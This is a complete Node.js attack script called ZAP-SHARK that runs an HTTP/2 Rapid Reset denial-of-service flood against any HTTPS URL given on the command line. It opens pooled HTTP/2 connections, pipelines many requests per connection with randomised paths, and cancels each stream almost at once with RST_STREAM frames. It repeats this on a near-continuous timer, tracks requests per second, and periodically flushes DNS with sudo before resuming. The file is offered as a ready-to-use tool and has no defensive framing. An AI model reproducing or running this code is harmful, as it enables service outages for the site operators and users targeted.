const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // RAPID RESET CONFIG
        this.connectionPool = [];
        this.poolSize = 3; // Reduced - rapid reset needs fewer connections
        this.activeStreams = 0;
        this.maxStreamsPerConn = 1000; // H2 server limit
        this.resetDelay = 1; // ms to wait before RST_STREAM
        
        // PIPELINING
        this.pipelineDepth = 50; // Requests in flight per connection
        this.pipelineQueue = [];
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.attackInterval = null;
    }

    async setupConnections() {
        for (let i = 0; i < this.poolSize; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 65536,
                    maxDeflateDynamicTableSize: 65536,
                    peerMaxConcurrentStreams: 1000,
                    settings: {
                        initialWindowSize: 6291456, // Max window size
                        maxConcurrentStreams: 1000,
                        maxFrameSize: 16384
                    }
                });
                
                client.setMaxListeners(1000);
                
                // Track connection for pipelining
                client._pendingStreams = 0;
                client._pipelineQueue = [];
                
                client.on('remoteSettings', (settings) => {
                    if (settings.maxConcurrentStreams) {
                        this.maxStreamsPerConn = Math.min(settings.maxConcurrentStreams, 1000);
                    }
                });
                
                this.connectionPool.push(client);
                
                await new Promise(r => setTimeout(r, 50));
                
            } catch (err) {
                // Silent fail
            }
        }
    }

    sendRapidReset() {
        if (this.connectionPool.length === 0) return;

        for (const client of this.connectionPool) {
            if (client.destroyed) continue;
            
            // PIPELINING: Send multiple requests before any responses
            const streamsToCreate = Math.min(
                this.pipelineDepth - client._pendingStreams,
                this.maxStreamsPerConn - this.activeStreams
            );
            
            for (let i = 0; i < streamsToCreate; i++) {
                this.activeStreams++;
                client._pendingStreams++;
                
                try {
                    const req = client.request({
                        ':method': 'GET',
                        ':path': '/?' + Math.random(),
                        ':authority': new URL(this.targetUrl).hostname,
                        'user-agent': 'Mozilla/5.0',
                        'accept': '*/*'
                    });
                    
                    // RAPID RESET: Cancel immediately
                    setTimeout(() => {
                        try {
                            // Send RST_STREAM frame (cancellation)
                            req.close(http2.constants.NGHTTP2_CANCEL);
                            // Alternative: destroy stream
                            req.destroy();
                        } catch (err) {
                            // Stream already closed
                        }
                        this.activeStreams--;
                        client._pendingStreams--;
                        
                        // COUNT IT
                        this.totalRequests++;
                        this.requestsSinceLastCalc++;
                    }, this.resetDelay);
                    
                    req.on('error', () => {});
                    req.on('close', () => {
                        client._pendingStreams--;
                    });
                    
                    req.end();
                    
                } catch (err) {
                    this.activeStreams--;
                    client._pendingStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                }
            }
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                           `TOTAL: ${this.totalRequests} | ` +
                           `RPS: ${this.currentRPS.toFixed(1)} | ` +
                           `RR: ${this.pipelineDepth}x`);
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns >nul 2>&1', () => {});
        } else {
            exec('sudo dscacheutil -flushcache 2>/dev/null || sudo systemd-resolve --flush-caches 2>/dev/null || true', () => {});
        }
    }

    flushSockets() {
        this.connectionPool.forEach(client => {
            try {
                client.destroy();
            } catch (err) {}
        });
        this.connectionPool = [];
        this.activeStreams = 0;
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            this.status = "PAUSED";
            
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
                this.attackInterval = null;
            }
            
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                this.status = "ATTACKING";
                this.lastMaintenance = Date.now();
                this.setupConnections();
                setTimeout(() => this.startAttack(), 1000);
            }, this.maintenanceDuration);
        }
    }

    startAttack() {
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        
        // AGGRESSIVE TIMING FOR RAPID RESET
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                this.sendRapidReset();
                this.updateDisplay();
            }
        }, 0.01); // 100 calls per second
    }

    async start() {
        this.lastMaintenance = Date.now();
        
        console.log("=== ZAP-SHARK RAPID RESET EDITION ===");
        console.log("Target:", this.targetUrl);
        console.log("Mode: H2 Rapid Reset + Pipelining");
        console.log("Pipeline Depth:", this.pipelineDepth);
        console.log("Reset Delay:", this.resetDelay + "ms");
        console.log("=".repeat(50));
        
        await this.setupConnections();
        
        setTimeout(() => {
            this.startAttack();
        }, 2000);
        
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        process.on('SIGINT', () => {
            this.running = false;
            if (this.attackInterval) clearInterval(this.attackInterval);
            this.flushSockets();
            console.log('\n=== ZAP-SHARK STOPPED ===');
            process.exit(0);
        });
    }
}

// Usage
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-rr.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start();
